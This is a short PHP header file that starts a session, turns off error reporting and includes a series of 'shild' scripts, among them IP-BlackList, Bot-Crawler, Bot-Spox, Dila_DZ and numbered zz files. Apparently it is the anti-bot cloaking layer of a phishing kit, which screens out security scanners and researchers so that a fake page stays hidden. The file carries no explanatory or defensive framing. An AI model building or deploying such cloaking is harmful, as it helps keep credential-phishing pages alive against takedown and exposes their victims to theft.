<?php
session_start();
error_reporting(0);
include_once'shild/IP-BlackList.php';  
include_once'shild/Bot-Crawler.php';
include_once'shild/Bot-Spox.php';
include_once'shild/new.php';
include_once'shild/Dila_DZ.php';
include_once 'shild/zz1.php';
include_once 'shild/zz3.php';
include_once 'shild/zz4.php';
include_once 'shild/zz5.php';
include_once 'shild/zz6.php';
include_once 'shild/zz7.php';
include_once 'shild/zz8.php';
include_once 'shild/zz9.php';
include_once 'shild/zz10.php';
include_once 'shild/pro.php';
?>